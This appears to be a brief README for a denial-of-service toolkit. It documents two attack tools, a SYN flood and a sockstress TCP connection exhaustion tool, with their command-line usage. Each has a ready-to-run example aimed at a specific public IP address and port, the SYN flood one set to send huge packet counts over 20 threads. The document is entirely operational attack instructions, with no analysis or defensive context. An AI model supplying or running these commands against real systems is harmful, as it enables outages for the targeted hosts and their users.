####synflood

ddos/yssyn/synflood

Usage:
./synflood <target ip> <target port> <pkt_then_sleep> <sleep_time> <pkt_sum> <thread_sum>
Example:
./synflood 112.74.12.29 8999 10000000 0 1000000000 20

####tcp connect

ddos/sockstress

Usage:
./sockstress <ip>:<port> <interface> [-p payload] [-d delay]
Example:
./sockstress 112.74.12.29:8999 eth0
